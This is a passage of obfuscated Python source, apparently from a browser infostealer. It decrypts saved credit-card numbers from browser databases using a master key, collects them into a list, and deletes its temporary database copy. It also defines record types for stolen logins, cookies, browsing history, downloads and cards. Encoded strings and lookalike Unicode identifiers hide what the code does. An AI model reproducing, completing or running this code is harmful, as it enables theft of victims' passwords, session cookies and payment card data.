𝘇𝗶𝙥(*[𝙞𝙩𝘦𝗿(__𝗶𝗺𝙥𝙤𝙧𝘵__('base64').b64decode(__𝗶𝙢𝙥𝗼𝗿𝙩__('zlib').decompress(b'x\xda\xf3\xadr5\x01\x00\x03d\x01A')).decode())] * 3)), 𝙧𝙖𝙣𝘨𝘦(1)), __𝙞𝘮𝙥𝘰𝗿𝘁__('base64').b64decode(__𝙞𝙢𝙥𝗼𝙧𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]) or (not 𝘳𝗼𝘸[𝙞𝘯𝙩.from_bytes(𝘮𝗮𝗽(lambda O, i: 995 - (𝙞𝘯𝘵(𝗢) + 𝘪), 𝘮𝙖𝙥(__𝘪𝘮𝘱𝘰𝘳𝘵__('base64').b64decode(__𝘪𝗺𝗽𝘰𝗿𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝙞𝙥(*[𝙞𝘁𝗲𝘳(__𝘪𝗺𝙥𝘰𝘳𝘵__('base64').b64decode(__𝙞𝗺𝙥𝙤𝘳𝘵__('zlib').decompress(b'x\xda\xf3\x0f\xc9\xae\x04\x00\x03\x8b\x01\x88')).decode())] * 3)), 𝙧𝗮𝗻𝗴𝙚(1)), __𝙞𝘮𝘱𝙤𝙧𝘁__('base64').b64decode(__𝗶𝗺𝗽𝘰𝙧𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]):
                continue
            𝘤𝙖𝗿𝗱_𝙣𝘂𝘮𝘣𝗲𝘳 = 𝙨𝘦𝙡𝗳.decrypt_password(𝘳𝗼𝙬[𝘪𝗻𝙩.from_bytes(𝘮𝙖𝗽(lambda O, i: 389 - (𝙞𝙣𝘵(𝗢) + 𝘪), 𝙢𝘢𝗽(__𝙞𝙢𝙥𝘰𝙧𝙩__('base64').b64decode(__𝙞𝗺𝙥𝘰𝗿𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝙞𝙥(*[𝘪𝙩𝙚𝙧(__𝙞𝘮𝗽𝗼𝗿𝙩__('base64').b64decode(__𝗶𝙢𝗽𝘰𝘳𝙩__('zlib').decompress(b'x\xda\xf3\xadJ7\x02\x00\x03\xa6\x01a')).decode())] * 3)), 𝘳𝗮𝘯𝙜𝗲(1)), __𝙞𝘮𝙥𝗼𝙧𝘁__('base64').b64decode(__𝗶𝘮𝗽𝙤𝘳𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝙨𝙚𝙡𝘧.master_key)
            __𝗖𝘼𝙍𝗗𝙎__.append(𝗧𝙮𝗽𝙚𝘴.CreditCard(𝙧𝘰𝘄[𝙞𝘯𝘵.from_bytes(𝘮𝗮𝙥(lambda O, i: 825 - (𝘪𝗻𝘵(𝘖) + 𝙞), 𝘮𝘢𝗽(__𝙞𝙢𝙥𝘰𝗿𝙩__('base64').b64decode(__𝙞𝘮𝙥𝘰𝘳𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝗶𝘱(*[𝘪𝙩𝘦𝗿(__𝙞𝗺𝙥𝘰𝗿𝘵__('base64').b64decode(__𝘪𝗺𝗽𝗼𝘳𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝙧𝘢𝘯𝙜𝗲(0)), __𝗶𝙢𝘱𝘰𝙧𝘁__('base64').b64decode(__𝗶𝗺𝙥𝗼𝘳𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝗿𝙤𝘄[𝘪𝘯𝘵.from_bytes(𝘮𝘢𝙥(lambda O, i: 274 - (𝗶𝘯𝘁(𝙊) + 𝙞), 𝗺𝘢𝘱(__𝗶𝘮𝗽𝘰𝙧𝙩__('base64').b64decode(__𝗶𝙢𝙥𝘰𝘳𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝗶𝙥(*[𝗶𝙩𝘦𝘳(__𝙞𝙢𝙥𝗼𝘳𝙩__('base64').b64decode(__𝗶𝗺𝗽𝘰𝘳𝘵__('zlib').decompress(b'x\xda\xf3\xcdJ\xae\x02\x00\x03\xb6\x01\x95')).decode())] * 3)), 𝘳𝙖𝘯𝙜𝙚(1)), __𝗶𝗺𝘱𝙤𝙧𝘵__('base64').b64decode(__𝗶𝘮𝘱𝗼𝙧𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝗿𝙤𝙬[𝘪𝘯𝘵.from_bytes(𝙢𝗮𝘱(lambda O, i: 437 - (𝗶𝙣𝙩(𝗢) + 𝘪), 𝗺𝗮𝘱(__𝙞𝗺𝘱𝙤𝘳𝙩__('base64').b64decode(__𝗶𝙢𝙥𝙤𝙧𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝗶𝙥(*[𝘪𝙩𝗲𝘳(__𝘪𝘮𝙥𝙤𝙧𝘵__('base64').b64decode(__𝙞𝘮𝗽𝙤𝘳𝘁__('zlib').decompress(b'x\xda\xf3s\xf15\x04\x00\x02\xd3\x01\x11')).decode())] * 3)), 𝗿𝙖𝘯𝘨𝘦(1)), __𝘪𝘮𝘱𝙤𝘳𝙩__('base64').b64decode(__𝙞𝘮𝘱𝘰𝗿𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝘤𝘢𝙧𝘥_𝙣𝘶𝙢𝗯𝘦𝗿, 𝘳𝘰𝘄[𝙞𝘯𝙩.from_bytes(𝘮𝙖𝙥(lambda O, i: 566 - (𝘪𝘯𝙩(𝙊) + 𝘪), 𝙢𝘢𝘱(__𝙞𝙢𝘱𝙤𝘳𝘵__('base64').b64decode(__𝗶𝗺𝙥𝗼𝘳𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝗶𝘱(*[𝗶𝘵𝗲𝗿(__𝘪𝙢𝘱𝗼𝗿𝙩__('base64').b64decode(__𝗶𝘮𝗽𝙤𝙧𝙩__('zlib').decompress(b'x\xda\xf3\x0b\x89\xac\x04\x00\x03c\x01u')).decode())] * 3)), 𝘳𝘢𝗻𝘨𝙚(1)), __𝙞𝙢𝙥𝗼𝗿𝘁__('base64').b64decode(__𝗶𝗺𝘱𝘰𝙧𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]))
        𝙘𝙤𝘯𝗻.close()
        𝙤𝙨.remove(__𝘪𝗺𝙥𝘰𝘳𝘁__('base64').b64decode(__𝘪𝘮𝘱𝗼𝘳𝘁__('zlib').decompress(b'x\xda\x8b4r\xab\x8c\xf2\xf0K\x8br\xf7\xb4\x05\x00\x19\x01\x03\xc8')).decode())

class Types:

    class Login:

        def __init__(self, url, username, password):
            𝘴𝙚𝘵𝗮𝘵𝙩𝗿(𝙨𝗲𝙡𝗳, 'url', 𝘂𝘳𝘭)
            𝘀𝙚𝘁𝙖𝙩𝘵𝙧(𝙨𝘦𝗹𝙛, 'username', 𝘶𝘀𝗲𝙧𝘯𝗮𝗺𝗲)
            𝙨𝗲𝘁𝘢𝙩𝘁𝗿(𝘀𝘦𝘭𝙛, 'password', 𝘱𝙖𝘀𝙨𝙬𝘰𝘳𝘥)

        def __str__(self):
            return __𝘪𝘮𝗽𝘰𝙧𝘁__('base64').b64decode(__𝗶𝘮𝘱𝗼𝘳𝙩__('zlib').decompress(b'x\xdaK56\xf0J\x85`[\x00\x15\\\x03*')).decode().format(𝘀𝙚𝙡𝗳.url, 𝘴𝘦𝘭𝙛.username, 𝘀𝗲𝘭𝙛.password)

        def __repr__(self):
            return 𝘴𝘦𝘭𝗳.__str__()

    class Cookie:

        def __init__(self, host, name, path, value, expires):
            𝘴𝘦𝘵𝙖𝙩𝘵𝗿(𝙨𝘦𝗹𝙛, 'host', 𝙝𝘰𝙨𝘵)
            𝘀𝗲𝙩𝘢𝘁𝙩𝘳(𝘀𝘦𝗹𝘧, 'name', 𝘯𝙖𝙢𝗲)
            𝙨𝗲𝘵𝗮𝘁𝙩𝙧(𝘀𝙚𝘭𝘧, 'path', 𝙥𝙖𝘵𝘩)
            𝘴𝘦𝙩𝙖𝘁𝙩𝗿(𝘀𝗲𝘭𝗳, 'value', 𝙫𝗮𝙡𝙪𝘦)
            𝘀𝗲𝘁𝗮𝙩𝘵𝘳(𝙨𝗲𝘭𝗳, 'expires', 𝙚𝘅𝘱𝘪𝘳𝗲𝙨)

        def __str__(self):
            return __𝗶𝘮𝙥𝘰𝘳𝙩__('base64').b64decode(__𝘪𝗺𝘱𝗼𝘳𝘵__('zlib').decompress(b'x\xdaK56\xf0J\xc5\x8em\x01m\xd8\x07r')).decode().format(𝘀𝙚𝘭𝘧.host, __𝘪𝙢𝘱𝙤𝘳𝘵__('base64').b64decode(__𝗶𝗺𝙥𝙤𝘳𝙩__('zlib').decompress(b'x\xda\x0b\xcav\xf3\r5\x08\xb5\x05\x00\x0bu\x02h')).decode() if 𝙨𝙚𝗹𝘧.expires == 𝗶𝙣𝘵.from_bytes(𝗺𝘢𝙥(lambda O, i: 618 - (𝗶𝙣𝘵(𝙊) + 𝗶), 𝗺𝗮𝘱(__𝗶𝘮𝘱𝘰𝗿𝘵__('base64').b64decode(__𝗶𝘮𝙥𝙤𝙧𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝗶𝗽(*[𝙞𝘵𝗲𝙧(__𝗶𝙢𝙥𝘰𝘳𝘁__('base64').b64decode(__𝘪𝙢𝙥𝘰𝘳𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝘳𝘢𝙣𝘨𝗲(0)), __𝗶𝗺𝗽𝘰𝗿𝙩__('base64').b64decode(__𝙞𝘮𝙥𝙤𝙧𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False) else __𝗶𝘮𝘱𝘰𝙧𝘁__('base64').b64decode(__𝘪𝗺𝘱𝘰𝙧𝙩__('zlib').decompress(b'x\xda\x0bs\xf3\n\x0b\n\xb4\xb5\x05\x00\n\xfe\x02Z')).decode(), 𝘴𝙚𝙡𝘧.path, __𝗶𝘮𝗽𝘰𝘳𝘁__('base64').b64decode(__𝘪𝙢𝘱𝘰𝘳𝙩__('zlib').decompress(b'x\xda\x0b\xcav\xf3\r5\x08\xb5\x05\x00\x0bu\x02h')).decode() if 𝘀𝘦𝘭𝙛.host.startswith(__𝘪𝗺𝙥𝙤𝘳𝘁__('base64').b64decode(__𝙞𝘮𝘱𝘰𝗿𝘁__('zlib').decompress(b'x\xda\xf3I\xb7\xb5\x05\x00\x03 \x01.')).decode()) else __𝗶𝘮𝗽𝘰𝘳𝙩__('base64').b64decode(__𝗶𝗺𝙥𝘰𝘳𝘁__('zlib').decompress(b'x\xda\x0bs\xf3\n\x0b\n\xb4\xb5\x05\x00\n\xfe\x02Z')).decode(), 𝘴𝗲𝘭𝘧.expires, 𝘴𝗲𝙡𝘧.name, 𝙨𝙚𝘭𝗳.value)

        def __repr__(self):
            return 𝙨𝙚𝘭𝗳.__str__()

    class WebHistory:

        def __init__(self, url, title, timestamp):
            𝘀𝙚𝘵𝗮𝘵𝘁𝘳(𝙨𝙚𝗹𝘧, 'url', 𝘂𝗿𝘭)
            𝘀𝘦𝘁𝘢𝘵𝘵𝗿(𝘴𝙚𝗹𝗳, 'title', 𝙩𝗶𝙩𝙡𝙚)
            𝘀𝙚𝘵𝗮𝙩𝘁𝗿(𝘴𝗲𝘭𝘧, 'timestamp', 𝘁𝙞𝗺𝙚𝙨𝘁𝘢𝗺𝙥)

        def __str__(self):
            return __𝗶𝘮𝘱𝗼𝙧𝘁__('base64').b64decode(__𝘪𝗺𝘱𝙤𝙧𝙩__('zlib').decompress(b'x\xdaK56\xf0J\x85`[\x00\x15\\\x03*')).decode().format(𝘴𝘦𝘭𝙛.url, 𝘴𝘦𝙡𝘧.title, 𝘀𝘦𝙡𝗳.timestamp)

        def __repr__(self):
            return 𝘴𝘦𝙡𝘧.__str__()

    class Download:

        def __init__(self, tab_url, target_path):
            𝘴𝘦𝘵𝗮𝘁𝙩𝗿(𝘴𝘦𝗹𝗳, 'tab_url', 𝘁𝘢𝙗_𝙪𝘳𝘭)
            𝘴𝘦𝙩𝘢𝙩𝙩𝗿(𝙨𝗲𝗹𝘧, 'target_path', 𝘁𝘢𝘳𝙜𝙚𝙩_𝘱𝘢𝘵𝙝)

        def __str__(self):
            return __𝗶𝘮𝙥𝙤𝘳𝘁__('base64').b64decode(__𝗶𝗺𝘱𝙤𝘳𝘵__('zlib').decompress(b'x\xdaK56\xf0J56\xb0\x05\x00\t\xf1\x02\x18')).decode().format(𝙨𝗲𝙡𝗳.tab_url, 𝘴𝙚𝗹𝙛.target_path)

        def __repr__(self):
            return 𝘀𝙚𝘭𝙛.__str__()

    class CreditCard:

        def __init__(self, name, month, year, number, date_modified):
            𝙨𝙚𝘵𝙖𝙩𝘁𝙧(𝘀𝘦𝘭𝗳, 'name', 𝗻𝗮𝘮𝙚)
            𝙨𝘦𝙩𝗮𝘵𝙩𝘳(𝙨𝘦𝙡𝗳, 'month', 𝘮𝗼𝗻𝘁𝘩)
            𝘀𝗲𝘵𝗮𝘵𝘁𝙧(𝙨𝗲𝙡𝙛, 'year', 𝙮𝙚𝙖𝙧)
            𝘀𝘦𝙩𝘢𝙩𝘁𝙧(𝘴𝙚𝙡𝗳, 'number', 𝗻𝘶𝗺𝙗𝘦𝙧)
            𝘴𝗲𝘁𝘢𝘁𝘵𝘳(𝘴𝘦𝗹𝙛, 'date_modified', 𝙙𝗮𝘁𝗲_𝙢𝘰𝘥𝗶𝗳𝗶𝗲𝙙)

        def __str__(self):
            return __𝗶𝙢𝙥𝙤𝘳𝘵__('base64').b64decode(__𝗶𝗺𝗽𝘰𝗿𝙩__('zlib').decompress(b'x\xdaK56\xf0JE\xc5\xb6\x009\n\x05N')).decode().format(𝘴𝘦𝙡𝙛.name, 𝘴𝙚𝘭𝗳.month, 𝙨𝘦𝘭𝗳.year, 𝘀𝙚𝙡𝙛.number, 𝘀𝘦𝗹𝙛.date_modified)

        def __repr__(self):
            return 𝘴𝘦𝙡𝗳.__str__()